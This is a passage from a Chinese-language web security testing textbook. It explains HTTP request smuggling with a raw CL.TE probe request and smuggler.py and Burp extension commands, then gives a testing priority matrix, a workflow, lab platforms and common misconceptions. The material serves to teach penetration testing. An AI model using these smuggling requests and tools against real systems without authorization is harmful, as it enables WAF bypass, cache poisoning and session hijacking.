HTTP请求走私是利用前端代理服务器（如CDN、负载均衡器）和后端服务器对HTTP请求边界解析不一致的攻击技术。2019年PortSwigger研究员James Kettle发表了突破性研究，揭示了该技术的严重性。

#### 14.21.8.1 原理

```text
核心矛盾：HTTP/1.1允许两种方式确定请求体边界
1. Content-Length（CL）：明确指定字节数
2. Transfer-Encoding: chunked（TE）：分块传输，每块前有长度，以0长度块结束

当代理使用CL，后端使用TE（或反之），攻击者可以构造一个请求
让前后的服务器对"请求边界"理解不同，导致走私一个"前缀"到下一个请求中。
```

**三种走私方式**

```text
CL.TE：代理用Content-Length，后端用Transfer-Encoding
TE.CL：代理用Transfer-Encoding，后端用Content-Length
TE.TE：两个服务器都支持TE，但对畸形TE头的处理不同
```

#### 14.21.8.2 测试方法

```bash
# CL.TE攻击示例
# 发送以下原始请求（注意Transfer-Encoding后面有混淆）
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# 代理看到：Content-Length=13，读取到"0\r\n\r\nSMUGGLED"结束
# 后端看到：chunked，"0\r\n\r\n"表示请求结束，"SMUGGLED"成为下一个请求的前缀

# 使用Burp Suite扩展
# 1. 安装 HTTP Request Smuggler 扩展
# 2. 右键目标 -> Extensions -> HTTP Request Smuggler -> Smuggle attack
# 3. 自动检测CL.TE、TE.CL、TE.TE变种

# 使用 smuggler.py
# 安装：git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com
```

#### 14.21.8.3 利用场景

```text
1. 绕过WAF：走私的请求不经过WAF检查
2. 缓存投毒：走私的响应被缓存，影响后续用户
3. 会话劫持：走私到其他用户的连接
4. 前端请求拆分（HRS.CE）：HTTP/2引入的新变种
```

---

### 14.21.9 高级安全测试方法论

#### 14.21.9.1 测试优先级矩阵

| 攻击面 | 影响 | 发现难度 | 利用难度 | 优先级 |
|--------|------|----------|----------|--------|
| API批量分配 | 高 | 低 | 低 | P0 |
| JWT算法混淆 | 高 | 中 | 低 | P0 |
| SSTI | 严重 | 中 | 低 | P0 |
| 反序列化 | 严重 | 中 | 高 | P1 |
| OAuth redirect绕过 | 高 | 中 | 中 | P1 |
| 原型污染 | 高 | 高 | 中 | P1 |
| WebSocket CSWSH | 中 | 中 | 中 | P2 |
| HTTP请求走私 | 高 | 高 | 高 | P2 |
| GraphQL深度嵌套DoS | 中 | 低 | 低 | P2 |

#### 14.21.9.2 自动化测试工作流

```mermaid
graph TD
    A[目标站点] --> B{API类型判断}
    B -->|REST| C[端点枚举 + 方法测试]
    B -->|GraphQL| D[内省查询 + Schema分析]
    B -->|WebSocket| E[连接测试 + 消息注入]
    
    C --> F{认证方式}
    F -->|JWT| G[算法混淆 + 密钥爆破]
    F -->|OAuth| H[redirect绕过 + state测试]
    F -->|Session| I[会话管理测试]
    
    D --> J[批量查询 + 深层嵌套]
    J --> K[字段级权限测试]
    
    G --> L[报告生成]
    H --> L
    I --> L
    K --> L
    E --> L
    
    C --> M{上传功能?}
    M -->|是| N[扩展名绕过 + 解析漏洞]
    N --> L
    
    C --> O{模板引擎?}
    O -->|是| P[SSTI检测 + 利用]
    P --> L
```

#### 14.21.9.3 实战练习平台

```text
1. OWASP crAPI        - 完整的API安全漏洞靶场
2. PortSwigger Labs   - OAuth、WebSocket、SSTI、请求走私等专项实验室
3. HackTheBox         - 包含大量API和Web漏洞的CTF靶机
4. DVGA               - Damn Vulnerable GraphQL Application
5. WebGoat            - OWASP官方教学靶场，覆盖本节所有主题
6. juice-shop         - OWASP Juice Shop，30+种漏洞场景
7. VAmPI              - Vulnerable API，专门用于API安全练习
```

---

### 14.21.10 常见误区与纠正

| 误区 | 正确做法 |
|------|----------|
| API有认证就安全 | 认证只是第一道门，还需要鉴权（每个端点、每个方法） |
| JWT加密了就安全 | JWT默认只编码不加密，Payload对所有人可见；关键是签名验证 |
| WebSocket比HTTP安全 | WebSocket本身不提供安全机制，需要应用层实现认证和授权 |
| 文件上传只检查扩展名 | 需要多层防御：扩展名 + MIME + 文件内容 + 重编码 + 权限限制 |
| OAuth用HTTPS就是安全的 | HTTPS只保护传输层，redirect_uri绕过、CSRF等是应用层问题 |
| GraphQL没有SQL注入 | GraphQL参数同样需要参数化查询，不能直接拼接 |
| 反序列化只影响Java | PHP、Python、Ruby、.NET都有反序列化漏洞 |
| 原型污染是理论攻击 | 已有大量真实CVE，包括RCE利用链 |

---

### 14.21.11 本节小结

本节覆盖了OWASP Top 10之外的高级Web安全测试技术：

1. **API安全**：端点枚举、HTTP方法测试、批量分配、JWT攻击、GraphQL特有漏洞
2. **OAuth 2.0**：redirect_uri绕过、CSRF、授权码泄露、scope提升
3. **WebSocket**：跨站劫持、消息注入、拒绝服务
4. **文件上传**：扩展名绕过、文件头伪造、服务器解析漏洞、多层防御
5. **原型污染**：JavaScript特有的对象模型漏洞，可导致权限绕过和RCE
6. **SSTI**：服务端模板注入的检测和各引擎利用
7. **反序列化**：各语言的危险反序列化操作及利用链
8. **HTTP请求走私**：代理与后端解析不一致导致的请求边界攻击

这些技术共同构成了高级Web安全测试的完整知识体系。掌握它们的关键在于：理解原理而非死记Payload，在合法靶场上反复练习，并保持对新技术趋势的关注。

***

> "Web安全是一个持续演进的领域。每一种防御都会催生新的绕过，每一种新技术都会引入新的攻击面。保持好奇心和学习能力，比掌握任何单一技术都更重要。"
